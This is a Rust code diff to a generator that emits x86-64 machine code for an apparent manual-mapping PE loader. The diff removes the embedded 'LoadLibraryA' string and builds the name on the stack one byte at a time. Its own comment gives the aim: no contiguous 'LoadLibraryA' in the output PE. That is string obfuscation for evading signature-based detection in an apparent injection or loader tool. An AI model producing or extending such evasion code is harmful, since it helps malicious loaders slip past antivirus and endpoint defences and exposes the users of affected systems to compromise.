@@ -322,10 +322,29 @@ fn gen_h00_manual_map_body(
     let jz_skip_ll_boot2 = c.len();
     c.extend_from_slice(&[0x0F, 0x84, 0, 0, 0, 0]);
     c.extend_from_slice(&[0x48, 0x89, 0xC7]); // rdi = kernel32
-    let lea_ll_name = c.len();
-    c.extend_from_slice(&[0x48, 0x8D, 0x15, 0, 0, 0, 0]); // lea rdx,[rip+LoadLibraryA]
+    // Build export name on stack byte-by-byte (no contiguous "LoadLibraryA" in PE).
+    c.extend_from_slice(&[0x48, 0x83, 0xEC, 0x20]); // sub rsp, 0x20
+    for (off, ch) in [
+        (0u8, b'L'),
+        (1, b'o'),
+        (2, b'a'),
+        (3, b'd'),
+        (4, b'L'),
+        (5, b'i'),
+        (6, b'b'),
+        (7, b'r'),
+        (8, b'a'),
+        (9, b'r'),
+        (10, b'y'),
+        (11, b'A'),
+        (12, 0),
+    ] {
+        c.extend_from_slice(&[0xC6, 0x44, 0x24, off, ch]);
+    }
+    c.extend_from_slice(&[0x48, 0x8D, 0x14, 0x24]); // lea rdx, [rsp]
     let call_boot_resolve = c.len();
     c.extend_from_slice(&[0xE8, 0, 0, 0, 0]);
+    c.extend_from_slice(&[0x48, 0x83, 0xC4, 0x20]); // add rsp, 0x20
     c.extend_from_slice(&[0x49, 0x89, 0x47, H00_LOADLIBRARY_SCRATCH_OFF]); // [r15+scratch]=LoadLibraryA
     let skip_ll_boot = c.len();
     patch_rel32(&mut c, jz_skip_ll_boot + 2, jz_skip_ll_boot + 6, skip_ll_boot);
@@ -695,17 +714,6 @@ fn gen_h00_manual_map_body(
     patch_rel32(&mut c, jb_ff_ret + 2, jb_ff_ret + 6, ff_ret);
     patch_rel32(&mut c, jae_ff_ret + 2, jae_ff_ret + 6, ff_ret);
     patch_rel32(&mut c, jz_ff_bad + 2, jz_ff_bad + 6, ff_ret);
-
-    let embedded_loadlibrary_a = c.len();
-    c.extend_from_slice(b"LoadLibraryA\0");
-    fix_rip_disp(
-        &mut c,
-        lea_ll_name + 3,
-        text_rva,
-        chunk_text_off,
-        lea_ll_name + 7,
-        text_rva + chunk_text_off + embedded_loadlibrary_a as u32,
-    );
 
     let helpers_end = c.len();
     patch_rel32(&mut c, jmp_over_helpers + 1, jmp_over_helpers + 5, helpers_end);
